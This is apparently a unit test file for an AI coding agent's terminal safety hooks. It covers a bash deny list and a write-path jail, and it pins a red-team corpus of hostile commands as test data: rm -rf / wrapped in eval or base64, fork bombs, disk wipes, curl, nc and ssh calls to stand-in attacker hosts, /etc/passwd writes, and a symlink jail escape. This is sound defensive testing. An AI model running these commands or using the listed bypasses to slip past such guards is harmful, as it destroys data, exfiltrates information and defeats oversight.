// Unit tests for the terminal hook logic (src/termhooks.ts) plus the pure
// PreToolUse decision functions it delegates to (src/hooks.ts: decideBash,
// jailPath).
//
// Backlog reference: docs/testing-strategy.md §4.3 ("CLI and terminal hooks") —
// the adversarial corpus below is drawn from that section. The bypasses the
// corpus found (wrapped rm payloads, `/*`/`${HOME}` targets, named fork
// bombs, numeric-IP hosts, ssh, find/xargs/base64 deletion, in-jail symlink
// escapes) are FIXED in src/hooks.ts + src/termhooks.ts (task 2-e-4): the
// former BUG pins below now assert the closed behavior, and the full §4.3
// corpus is pinned as a block/allow matrix ("§4.3 adversarial corpus").
// Documented terminal policy — not bugs: in non-strict sessions network and
// `git push` are allowed ("real work needs them"), sudo is strict-only, and
// reads are unrestricted (§4.3 says to document that as accepted policy).
//
// These tests run on `bun test` (bun:test is built in — zero new deps).
//
// Jail fixtures live outside the allowed tmp roots deliberately (POSIX:
// /var/tmp/engine-tests-b — NOT /tmp/engine-tests-b; Windows: a scratch dir
// under $HOME): the terminal write-path policy allows everything resolving
// under os.tmpdir() and POSIX /tmp, so a project fixture inside /tmp would
// mask every traversal escape (they would all resolve into the allowed
// /tmp subtree).
import "./_env.ts"; // MUST be the first import: store.ts opens SQLite at module scope
import { afterAll, beforeEach, describe, expect, test } from "bun:test";
import { mkdirSync, readlinkSync, realpathSync, rmSync, symlinkSync } from "node:fs";
import { homedir, platform, tmpdir } from "node:os";
import { join } from "node:path";
import { decideBash, jailPath } from "../src/hooks.ts";
import { buildTerminalNote, createTerminalExtension } from "../src/termhooks.ts";
import { TEST_TMP } from "./_env.ts";

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------
// /var/tmp on POSIX is NOT an allowed write root (that is the point — see the
// header). Windows has no /var/tmp, so a homedir-based scratch dir plays the
// same role there: equally outside the allowed tmp roots.
const VT_BASE = platform() === "win32" ? join(homedir(), ".unown-termhooks-fixtures") : "/var/tmp";
const VT_DIR = platform() === "win32" ? join(VT_BASE, "engine-tests-b") : `${VT_BASE}/engine-tests-b`;
mkdirSync(VT_DIR, { recursive: true });
// macOS realpaths /var/tmp into /private/var/tmp — build fixtures AND
// expectations from the physical path so the jail's realpath-resolved
// outputs compare equal on darwin too (jailPath realpaths both sides).
const VT_ROOT = (() => {
	try {
		return realpathSync(VT_DIR);
	} catch {
		return VT_DIR; // exotic host: keep the literal spelling
	}
})();
const PROJ = join(VT_ROOT, "termhooks", "proj");
const OUTSIDE = join(VT_ROOT, "termhooks", "outside");

mkdirSync(join(VT_ROOT, "termhooks"), { recursive: true });
rmSync(PROJ, { recursive: true, force: true }); // fresh on every run
mkdirSync(PROJ, { recursive: true });
mkdirSync(OUTSIDE, { recursive: true });
// POSIX-only fixture (Windows symlinkSync needs admin/DevMode — every test
// that consumes the `link` escapes below is skipIf(win32)).
if (process.platform !== "win32" && !process.env.UNOWN_TEST_KEEP_FIXTURES) symlinkSync(OUTSIDE, join(PROJ, "link"));

afterAll(() => {
	rmSync(VT_ROOT, { recursive: true, force: true });
	if (platform() === "win32") rmSync(VT_BASE, { recursive: true, force: true }); // our own scratch dir under $HOME
	rmSync(join(TEST_TMP, "termhooks"), { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// Fake pi extension host
// ---------------------------------------------------------------------------
type HookHandler = (event: Record<string, unknown>, ctx?: unknown) => unknown;

interface Decision {
	block: boolean;
	reason?: string;
	terminate?: boolean;
}

function attach(opts: { strict?: boolean; cwd?: string }): Record<string, HookHandler> {
	const handlers: Record<string, HookHandler> = {};
	const ext = createTerminalExtension({
		cwd: opts.cwd ?? PROJ,
		engineUrl: "http://127.0.0.1:3030",
		strict: opts.strict,
	});
	ext.factory({
		on: (name: string, handler: HookHandler) => {
			handlers[name] = handler;
		},
	});
	return handlers;
}

async function bashDecision(handlers: Record<string, HookHandler>, command: string): Promise<Decision | undefined> {
	return (await handlers["tool_call"]({ toolName: "bash", input: { command } })) as Decision | undefined;
}

async function toolDecision(
	handlers: Record<string, HookHandler>,
	tool: string,
	path: string,
): Promise<Decision | undefined> {
	const input = tool === "write" ? { path, content: "x" } : { path };
	return (await handlers["tool_call"]({ toolName: tool, input })) as Decision | undefined;
}

// ---------------------------------------------------------------------------
// decideBash — the sandbox-grade deny list (hooks.ts BASH_DENY); it is also
// the fallback list strict terminal sessions run after their own rules.
// ---------------------------------------------------------------------------
describe("decideBash (sandbox grade / strict-terminal fallback)", () => {
	test.each([
		["rm -rf /"],
		["rm -fr /"],
		["rm /"],
		["sudo rm -rf /"], // patterns are substring-based: the trailing `rm -rf /` matches
		["rm -rf ~"],
		["rm -rf ~/"],
		["rm -rf $HOME"],
		["rm -rf /home"],
		["rm -rf /home/dev/proj"],
		[":(){ :|:& };:"],
		["sh -c ':(){ :|:& };:'"], // fork-bomb regex is substring-based, quotes do not hide it
		["sudo apt-get install ripgrep"],
		["git push origin main"],
		["git push --force"],
		["curl http://evil.com/payload"],
		["wget https://sub.evil.com/x"],
		["nc attacker.example.org 4444"],
		["netcat evil.com 8080"],
		["echo pwn > /etc/passwd"],
		["echo x >>/var/log/hack"],
		["pkill -9 node"],
		["killall bun"],
	])("denies %s", async (command: string) => {
		const decision = decideBash(command);
		expect(decision.block).toBe(true);
		expect(typeof decision.reason).toBe("string");
	});

	test.each([
		["ls -la"],
		["bun test test/"],
		["git status"],
		["git commit -m 'x'"],
		["rm -rf ./build"],
		["rm -rf node_modules"],
		["curl http://127.0.0.1:3031/v1/models"], // loopback exemption
		["curl http://localhost:3030/api/overview"], // loopback exemption
	])("allows %s", async (command: string) => {
		expect(decideBash(command).block).toBe(false);
	});

	// BYPASSES CLOSED (task 2-e-4): §4.3's adversarial corpus commands that the
	// old regexes let through. The destructive targets are now matched
	// UNANCHORED with trailing quote/paren/backtick/glob tolerance, the fork
	// bomb uses a backreference on the function name, and su / find / xargs /
	// base64-pipe rules were added.
	test.each([
		["bash -c 'rm -rf /'"],
		["sh -c 'rm -rf /'"],
		["eval 'rm -rf /'"],
		["$(rm -rf /)"],
		["`rm -rf /`"],
		["python3 -c \"import os; os.system('rm -rf /')\""],
		["rm -rf /*"],
		["rm -rf ${HOME}"],
		["bomb(){ bomb|bomb& };bomb"],
		["su root -c id"],
		["find / -name '*.log' -delete"],
		["find / | xargs rm -rf"],
		["echo aGkgfHwgc2g= | base64 -d | sh"],
	])("denies %s (bypass closed)", async (command: string) => {
		const decision = decideBash(command);
		expect(decision.block).toBe(true);
		expect(typeof decision.reason).toBe("string");
	});

	// PARITY (task 2-e-4): the sandbox-grade list now carries the mkfs/dd/
	// chmod/wipefs rules too (previously terminal-only; the engine's bwrap
	// ro-rootfs was the backstop). Strict terminals run both lists either way.
	test.each([
		["mkfs.ext4 /dev/sda"],
		["dd if=/dev/zero of=/dev/sda"],
		["chmod -R 777 /"],
		["chmod 777 /"],
		["wipefs /dev/sda"],
	])("denies %s (terminal-list parity)", async (command: string) => {
		expect(decideBash(command).block).toBe(true);
	});

	test("reason strings identify the matched rule", async () => {
		expect(decideBash("rm -rf /").reason).toContain("filesystem root");
		expect(decideBash(":(){ :|:& };:").reason).toContain("fork bomb");
		expect(decideBash("sudo id").reason).toContain("sudo");
		expect(decideBash("git push").reason).toContain("git push");
		expect(decideBash("su root").reason).toContain("su");
		expect(decideBash("ssh user@host").reason).toContain("ssh");
		expect(decideBash("find / -delete").reason).toContain("find");
	});
});

// ---------------------------------------------------------------------------
// jailPath — the write-path jail (hooks.ts; termhooks adds a /tmp allowance
// on top of it). Lexical resolution PLUS a realpath re-check of the deepest
// existing ancestor (task 2-e-4) so in-jail symlinks cannot escape.
// ---------------------------------------------------------------------------
describe("jailPath (path jail with symlink resolution)", () => {
	test.each([
		["src/a.ts", true],
		["a.ts", true],
		["./nested/x.md", true],
		[PROJ, true], // the jail root itself is inside
		["/etc/passwd", false],
		["../../etc/passwd", false],
		["src/../../../../etc/passwd", false],
		["a/../..", false], // resolves above the jail root
	])("jailPath(%j) ok=%s", (p: string, ok: boolean) => {
		expect(jailPath(PROJ, p).ok).toBe(ok);
	});

	test("resolved path is returned for diagnostics", async () => {
		const { ok, resolved } = jailPath(PROJ, "src/../lib/x.ts");
		expect(ok).toBe(true);
		expect(resolved).toBe(join(PROJ, "lib", "x.ts"));
	});

	test("prefix safety: a sibling path sharing the prefix is NOT inside", async () => {
		// Pins the positive behavior: /projx must not be confused with /proj.
		expect(jailPath(PROJ, `${PROJ}x/src/a.ts`).ok).toBe(false);
	});

	test("empty and missing paths resolve to the jail root itself", async () => {
		expect(jailPath(PROJ, "").ok).toBe(true);
		expect(jailPath(PROJ, "").resolved).toBe(PROJ);
		// `p ?? "."` guard in hooks.ts
		expect(jailPath(PROJ, undefined as unknown as string).resolved).toBe(PROJ);
	});

	// POSIX-only quirk: on win32 "\etc\passwd" is a real absolute path and
	// resolves through node:path instead (the win32 twins live in
	// termhooks.windows.test.ts).
	test.skipIf(process.platform === "win32")(
		"QUIRK: backslash-separated paths are jailed as literal filenames on POSIX",
		() => {
			// The `root\\` prefix check hints at Windows support; on POSIX
			// "\etc\passwd" is a single relative segment, so it resolves INSIDE the
			// jail (safe by accident — the write tool would create a literal file).
			const jail = jailPath(PROJ, "\\etc\\passwd");
			expect(jail.ok).toBe(true);
			expect(jail.resolved).toBe(join(PROJ, "\\etc\\passwd"));
		},
	);

	test.skipIf(process.platform === "win32")("a symlink inside the jail pointing outside IS detected", () => {
		// Bypass closed (task 2-e-4): jailPath now realpath-resolves the deepest
		// existing ancestor and re-checks the prefix, so proj/link -> OUTSIDE no
		// longer smuggles writes past the jail. §4.3 listed this escape
		// explicitly.
		const jail = jailPath(PROJ, join("link", "evil.txt"));
		expect(jail.ok).toBe(false); // closed — the real write target is OUTSIDE
		expect(jail.resolved).toBe(join(OUTSIDE, "evil.txt"));
		expect(readlinkSync(join(PROJ, "link"))).toBe(OUTSIDE); // proves the escape is real
	});

	test("new files below nonexistent dirs stay allowed (no over-jailing)", async () => {
		// The realpath check only applies to EXISTING ancestors — the agent must
		// be able to create new files/dirs inside the jail.
		const jail = jailPath(PROJ, join("brand", "new", "deep", "file.ts"));
		expect(jail.ok).toBe(true);
		expect(jail.resolved).toBe(join(PROJ, "brand", "new", "deep", "file.ts"));
	});

	test.skipIf(process.platform === "win32")("a symlinked jail root keeps working (root is realpathed too)", () => {
		// /tmp-link -> PROJ: writes through the symlinked root must stay allowed,
		// so the root prefix used for the real-path re-check is realpathed as well.
		const rootLink = join(VT_ROOT, "termhooks", "rootlink");
		rmSync(rootLink, { force: true });
		symlinkSync(PROJ, rootLink);
		const jail = jailPath(rootLink, "src/a.ts");
		expect(jail.ok).toBe(true);
	});
});

// ---------------------------------------------------------------------------
// createTerminalExtension — non-strict bash policy (default terminal grade)
// ---------------------------------------------------------------------------
describe("createTerminalExtension — non-strict bash policy", () => {
	const handlers = attach({});

	test("extension shape", async () => {
		const ext = createTerminalExtension({ cwd: PROJ, engineUrl: "http://x" });
		expect(ext.name).toBe("unown-terminal");
		expect(ext.hidden).toBe(true);
	});

	test.each([
		["rm -rf /"],
		["rm -rf ~"],
		["rm -rf $HOME"],
		["rm -rf /home"],
		[":(){ :|:& };:"],
		["mkfs.ext4 /dev/sda"],
		["mkfs /dev/sda"],
		["dd if=/dev/zero of=/dev/nvme0n1"],
		["chmod -R 777 /"],
		["echo hacked > /etc/passwd"],
		["echo x > /root/.bashrc"],
		["echo x >/var/log/hack"],
	])("denies %s", async (command: string) => {
		expect((await bashDecision(handlers, command))?.block).toBe(true);
	});

	// Documented policy (termhooks.ts header): network + git push are ALLOWED
	// in terminal sessions; sudo and pkill are denied only under strict hooks.
	test.each([
		["git push origin main"],
		["git push --force"],
		["curl http://evil.com/x"],
		["wget http://evil.com/x"],
		["sudo make install"],
		["pkill -f my-dev-server"],
	])("POLICY: non-strict terminal allows %s", async (command: string) => {
		expect(await bashDecision(handlers, command)).toBeUndefined();
	});

	// BYPASSES CLOSED (task 2-e-4): the underlying regexes are shared with
	// hooks.ts — wrapped rm payloads, `/*`/`${HOME}`, `chmod 777 /` without -R,
	// named fork bombs, find/xargs/base64 deletion and su are denied by the
	// terminal list now too.
	test.each([
		["bash -c 'rm -rf /'"],
		["sh -c 'rm -rf /'"],
		["eval 'rm -rf /'"],
		["$(rm -rf /)"],
		["`rm -rf /`"],
		["rm -rf /*"],
		["rm -rf ${HOME}"],
		["chmod 777 /"],
		["bomb(){ bomb|bomb& };bomb"],
		["find / -delete"],
		["su root -c 'rm -rf /etc'"],
		["echo aGk= | base64 -d | sh"],
	])("denies %s (bypass closed)", async (command: string) => {
		expect((await bashDecision(handlers, command))?.block).toBe(true);
	});

	test("powershell tool calls route through the same bash policy", async () => {
		const decision = (await handlers["tool_call"]({
			toolName: "powershell",
			input: { command: "rm -rf /" },
		})) as Decision;
		expect(decision?.block).toBe(true);
	});

	test("deny decisions carry {block, reason, terminate:false}", async () => {
		expect(await bashDecision(handlers, "rm -rf /")).toEqual({
			block: true,
			reason: expect.any(String),
			terminate: false,
		});
	});
});

// ---------------------------------------------------------------------------
// createTerminalExtension — write/edit path jail (+ /tmp allowance)
// ---------------------------------------------------------------------------
describe("createTerminalExtension — write/edit path jail", () => {
	const handlers = attach({});

	test.each([
		["write", "/etc/passwd"],
		["write", "/var/log/hack"],
		["write", "/root/.ssh/authorized_keys"],
		["write", "../../etc/passwd"], // resolves outside PROJ
		["write", "/tmp/../etc/passwd"], // /tmp allowance is prefix-checked AFTER resolve
		["write", "/var/tmp/x"], // only /tmp (not /var/tmp) is allowed for terminal writes
		["edit", "/etc/hosts"],
		["edit", "../../../etc/passwd"],
	])("%s to %s is blocked", async (tool: string, path: string) => {
		const decision = await toolDecision(handlers, tool, path);
		expect(decision?.block).toBe(true);
		expect(decision?.reason).toContain("escapes the project directory");
	});

	// The explicit tmp allowance: POSIX /tmp, Windows %TEMP% — same semantic
	// (the system scratch area is an allowed write root on every platform).
	const TMP_A = platform() === "win32" ? join(tmpdir(), "session-notes.md") : "/tmp/session-notes.md";
	const TMP_B = platform() === "win32" ? join(tmpdir(), "sub", "dir", "x.md") : "/tmp/sub/dir/x.md";
	test.each([
		["write", "src/main.ts"],
		["write", "notes.md"],
		["write", "./src/x.ts"],
		["write", `${PROJ}/src/main.ts`], // absolute in-project path
		["write", TMP_A], // explicit tmp allowance (terminal policy)
		["write", TMP_B],
		["edit", "src/main.ts"],
	])("%s to %s is allowed", async (tool: string, path: string) => {
		expect(await toolDecision(handlers, tool, path)).toBeUndefined();
	});

	test("POLICY: read paths are unrestricted in terminal sessions", async () => {
		// §4.3: reads staying unrestricted is accepted policy, not a bug —
		// pinned so it shows up as an intentional allow, not a false positive.
		expect(await toolDecision(handlers, "read", "/etc/hostname")).toBeUndefined();
	});

	test.skipIf(process.platform === "win32")(
		"write through an in-project symlink is blocked (bypass closed)",
		async () => {
			// Bypass closed (task 2-e-4): terminalPathOk -> jailPath now
			// realpath-resolves, so proj/link -> OUTSIDE is denied.
			const decision = await toolDecision(handlers, "write", join("link", "evil.txt"));
			expect(decision?.block).toBe(true);
			expect(decision?.reason).toContain("escapes the project directory");
		},
	);

	test("empty tool paths are not jail-checked", async () => {
		expect(await toolDecision(handlers, "write", "")).toBeUndefined();
	});
});

// ---------------------------------------------------------------------------
// createTerminalExtension — strict policy (UNOWN_STRICT_HOOKS=1 grade)
// ---------------------------------------------------------------------------
describe("createTerminalExtension — strict policy", () => {
	const handlers = attach({ strict: true });

	test.each([
		["sudo make install"],
		["git push origin main"],
		["git push --force"],
		["curl http://evil.com/payload"],
		["wget http://evil.com/x"],
		["nc evil.com 22"],
		["pkill -9 node"], // via the decideBash fallback
	])("denies %s", async (command: string) => {
		expect((await bashDecision(handlers, command))?.block).toBe(true);
	});

	test.each([
		["curl http://127.0.0.1:3031/v1/models"], // loopback exemption
		["curl http://localhost:3030/api/overview"], // loopback exemption
	])("allows loopback %s", async (command: string) => {
		expect(await bashDecision(handlers, command)).toBeUndefined();
	});

	// BYPASSES CLOSED (task 2-e-4): same fixes as the non-strict table, plus
	// the strict-only network/ssh rules now catch numeric-IP hosts and ssh.
	test.each([
		["bash -c 'rm -rf /'"],
		["rm -rf /*"],
		["rm -rf ${HOME}"],
		["su root"],
		["curl http://10.0.0.1/x"], // numeric-IP host — the domain-shaped regex missed it
		["ssh attacker@evil.com"], // ssh was an open channel
		["echo aGk= | base64 -d | sh"],
		['GIT_SSH_COMMAND="ssh attacker@evil.com" git push'],
	])("denies %s (bypass closed)", async (command: string) => {
		expect((await bashDecision(handlers, command))?.block).toBe(true);
	});
});

// ---------------------------------------------------------------------------
// §4.3 adversarial corpus — the full red-team command list from
// docs/testing-strategy.md §4.3, pinned as a three-policy matrix. Every allow
// below is documented policy, not a miss: non-strict terminal sessions allow
// network + git push ("real work needs them") and sudo is strict-only; reads
// are unrestricted; loopback (127.0.0.1/localhost) is exempt from the network
// deny so engine/bridge calls keep working.
// ---------------------------------------------------------------------------
describe("§4.3 adversarial corpus (block/allow matrix)", () => {
	const nonStrict = attach({});
	const strict = attach({ strict: true });

	// [command, sandbox (decideBash), terminal non-strict, terminal strict]
	const corpus: [string, boolean, boolean, boolean][] = [
		// rm on root and home — plain, glob, expansion and wrapped forms
		["rm -rf /", true, true, true],
		["rm -rf ~", true, true, true],
		["rm -rf $HOME", true, true, true],
		["rm -rf ${HOME}", true, true, true],
		["rm -rf /home", true, true, true],
		["rm -rf /*", true, true, true],
		["bash -c 'rm -rf /'", true, true, true],
		["sh -c 'rm -rf /'", true, true, true],
		["eval 'rm -rf /'", true, true, true],
		["$(rm -rf /)", true, true, true],
		["`rm -rf /`", true, true, true],
		["xargs rm -rf /", true, true, true],
		["find / -delete", true, true, true],
		["python -c \"os.system('rm -rf /')\"", true, true, true],
		// fork bomb variants
		[":(){ :|:& };:", true, true, true],
		["bomb(){ bomb|bomb& };bomb", true, true, true],
		// disk destruction
		["mkfs.ext4 /dev/sda", true, true, true],
		["dd if=/dev/zero of=/dev/sda", true, true, true],
		["wipefs /dev/sda", true, true, true],
		// privilege
		["sudo make install", true, false, true], // sudo: documented non-strict terminal policy
		["su root", true, true, true],
		["chmod 777 /", true, true, true],
		["chmod -R 777 /", true, true, true],
		// network (strict denies; non-strict terminal policy allows)
		["curl http://evil.com/payload", true, false, true],
		["wget http://evil.com/x", true, false, true],
		["nc attacker.example.org 4444", true, false, true],
		["curl http://10.0.0.1/x", true, false, true],
		["ssh attacker@evil.com", true, false, true],
		["echo aGkgfHwgc2g= | base64 -d | sh", true, true, true],
		// git
		["git push origin main", true, false, true],
		["git push --force", true, false, true],
		['GIT_SSH_COMMAND="ssh attacker@evil.com" git push', true, false, true],
		// documented allows: loopback exemption, normal work
		["curl http://127.0.0.1:3031/v1/models", false, false, false], // loopback exemption
		["curl http://localhost:3030/api/overview", false, false, false], // loopback exemption
		["ls -la", false, false, false],
		["git status", false, false, false],
		["git commit -m 'x'", false, false, false],
		["rm -rf ./build", false, false, false],
	];

	test.each(corpus)("%s", async (command, sandboxBlock, nonStrictBlock, strictBlock) => {
		expect(decideBash(command).block).toBe(sandboxBlock);
		expect((await bashDecision(nonStrict, command))?.block ?? false).toBe(nonStrictBlock);
		expect((await bashDecision(strict, command))?.block ?? false).toBe(strictBlock);
	});

	// Path-jail half of the §4.3 corpus ("Path jail escape (terminal writes)").
	// The symlink-escape row needs the POSIX `link` fixture (skipIf win32);
	// the tmp allowance row is platform-conditional (same semantic everywhere).
	const TMP_ALLOW = platform() === "win32" ? join(tmpdir(), "session-notes.md") : "/tmp/session-notes.md";
	test.each([
		["write", "/etc/passwd", true], // absolute system path
		["write", "../../etc/passwd", true], // ../ traversal
		["write", "/tmp/../etc/passwd", true], // /tmp allowance is prefix-checked AFTER resolve
		...(process.platform === "win32"
			? []
			: ([["write", join("link", "evil.txt"), true]] as [string, string, boolean][])), // in-project symlink -> outside (closed; POSIX fixture)
		["write", TMP_ALLOW, false], // documented tmp allowance
		["write", "src/main.ts", false], // in-project
		["write", "~/.ssh/authorized_keys", false], // tilde is NOT shell-expanded by the file tools — literal '~' dir inside the jail (bash-side ~ targets are covered by the rm rules)
		["read", "/etc/hostname", false], // documented policy: reads unrestricted
	])("%s %s blocked=%s", async (tool: string, path: string, blocked: boolean) => {
		const decision = await toolDecision(nonStrict, tool, path);
		expect(Boolean(decision?.block)).toBe(blocked);
	});
});

// ---------------------------------------------------------------------------
// Session-note plumbing (only the non-delivery paths are safe to test
// in-process: real delivery POSTs to the LIVE engine on :3030)
// ---------------------------------------------------------------------------
describe("createTerminalExtension — session note plumbing", () => {
	test("session_shutdown(quit) with zero activity delivers no note", async () => {
		const handlers = attach({});
		const realFetch = globalThis.fetch;
		let calls = 0;
		globalThis.fetch = (async () => {
			calls++;
			throw new Error("fetch must not be called");
		}) as typeof fetch;
		try {
			// A denied tool call must NOT count as session activity.
			expect((await bashDecision(handlers, "rm -rf /"))?.block).toBe(true);
			const out = await handlers["session_shutdown"]({ reason: "quit" });
			expect(out).toBeUndefined();
			expect(calls).toBe(0);
		} finally {
			globalThis.fetch = realFetch;
		}
	});

	test("session_shutdown(reload) never delivers (session survives reloads)", async () => {
		const handlers = attach({});
		const out = await handlers["session_shutdown"]({ reason: "reload" });
		expect(out).toBeUndefined();
	});
});

// ---------------------------------------------------------------------------
// buildTerminalNote
// ---------------------------------------------------------------------------
describe("buildTerminalNote", () => {
	const FIXED_NOW = Date.UTC(2026, 9, 16, 12, 0, 0);

	function withFixedNow<T>(fn: () => T): T {
		const real = Date.now;
		Date.now = () => FIXED_NOW;
		try {
			return fn();
		} finally {
			Date.now = real;
		}
	}

	const base = {
		cwd: "/var/tmp/proj",
		prompts: 3,
		toolCalls: 12,
		toolNames: ["bash", "write"],
		lastAssistantText: "",
		sessionStartTs: FIXED_NOW - 5 * 60_000,
	};

	// M10: buildTerminalNote reads the session's shield telemetry; earlier
	// suites in this one-process run (the adversarial corpus) warm it and
	// the injection-suspicion line would appear. Pin the CLEAN session.
	beforeEach(() => {
		const { resetShieldTelemetry } = require("../src/shield.ts") as typeof import("../src/shield.ts");
		resetShieldTelemetry();
	});

	test("header line is outcome-first and carries no counts", async () => {
		const note = withFixedNow(() => buildTerminalNote(base));
		expect(note.split("\n")[0]).toBe("Terminal session outcome in /var/tmp/proj:");
	});

	test("duration is clamped to at least 1 minute", async () => {
		const note = withFixedNow(() => buildTerminalNote({ ...base, sessionStartTs: FIXED_NOW }));
		expect(note).toContain("1 min.");
	});

	test("QUIRK: durations round half-up (Math.round), 90 s renders as 2 min", async () => {
		const note = withFixedNow(() => buildTerminalNote({ ...base, sessionStartTs: FIXED_NOW - 90_000 }));
		expect(note).toContain("2 min.");
	});

	test("final outcome line truncates to 400 chars", async () => {
		const note = buildTerminalNote({ ...base, lastAssistantText: "x".repeat(500) });
		expect(note).toContain(`Final outcome: ${"x".repeat(400)}`);
		expect(note).not.toContain("x".repeat(401));
	});

	test("no outcome line when the last assistant text is empty", async () => {
		const note = buildTerminalNote({ ...base });
		expect(note).not.toContain("Final outcome:");
		expect(note.split("\n")).toHaveLength(2); // header + metadata
	});

	test("[subagent] tag appears when UNOWN_SUBAGENT=1", async () => {
		const prev = process.env.UNOWN_SUBAGENT;
		process.env.UNOWN_SUBAGENT = "1";
		try {
			const note = buildTerminalNote({ ...base });
			expect(note.split("\n")[0]).toContain("Terminal session [subagent] outcome in /var/tmp/proj");
		} finally {
			if (prev === undefined) delete process.env.UNOWN_SUBAGENT;
			else process.env.UNOWN_SUBAGENT = prev;
		}
	});
});

// ---------------------------------------------------------------------------
// agent_end final-outcome capture — pi's REAL message shape (audit MEDIUM-2):
// AssistantMessage.content is an ARRAY of typed blocks (TextContent |
// ThinkingContent | ToolCall) — never a string. The old string-only check
// matched nothing, so EVERY terminal note shipped without its "Final
// outcome:" line (the single most valuable dream input). termhooks.test.ts
// only fed buildTerminalNote a hand-made lastAssistantText, and goal.test.ts
// used fake STRING-content messages that never occur in reality.
// ---------------------------------------------------------------------------
describe("agent_end final-outcome capture (pi's real message shapes)", () => {
	test("array-content assistant messages are captured into the note's Final outcome line", async () => {
		const handlers = attach({});
		const realFetch = globalThis.fetch;
		let deliveredBody = "";
		globalThis.fetch = (async (_url: any, init: any) => {
			deliveredBody = String(init?.body ?? "");
			return new Response(JSON.stringify({ ok: true }), { headers: { "content-type": "application/json" } });
		}) as typeof fetch;
		try {
			handlers["input"]({ text: "add a sum function" }); // session activity
			handlers["agent_end"]({
				messages: [
					{ role: "user", content: "add a sum function" },
					{
						role: "assistant",
						content: [
							{ type: "thinking", text: "internal reasoning about the request" },
							{ type: "tool_call", id: "t1", name: "write" },
						],
					},
					{
						role: "assistant",
						content: [{ type: "text", text: "Created sum.ts and verified the tests pass." }],
					},
				],
			});
			await handlers["session_shutdown"]({ reason: "quit" });
			expect(deliveredBody).toContain("Final outcome:");
			expect(decoded(deliveredBody)).toContain("Created sum.ts and verified the tests pass.");
		} finally {
			globalThis.fetch = realFetch;
		}
	});

	test("thinking/tool-call-only assistant turns contribute NO Final outcome line", async () => {
		const handlers = attach({});
		const realFetch = globalThis.fetch;
		let deliveredBody = "";
		globalThis.fetch = (async (_url: any, init: any) => {
			deliveredBody = String(init?.body ?? "");
			return new Response(JSON.stringify({ ok: true }), { headers: { "content-type": "application/json" } });
		}) as typeof fetch;
		try {
			handlers["input"]({ text: "do something" });
			handlers["agent_end"]({
				messages: [
					{ role: "user", content: "do something" },
					{
						role: "assistant",
						content: [
							{ type: "thinking", text: "reasoning" },
							{ type: "tool_call", id: "t1", name: "bash" },
						],
					},
				],
			});
			await handlers["session_shutdown"]({ reason: "quit" });
			expect(decoded(deliveredBody)).not.toContain("Final outcome:");
		} finally {
			globalThis.fetch = realFetch;
		}
	});
});

/** The delivered note body is JSON — decode the content field for readable assertions. */
function decoded(body: string): string {
	try {
		return String(JSON.parse(body).content ?? "");
	} catch {
		return body;
	}
}
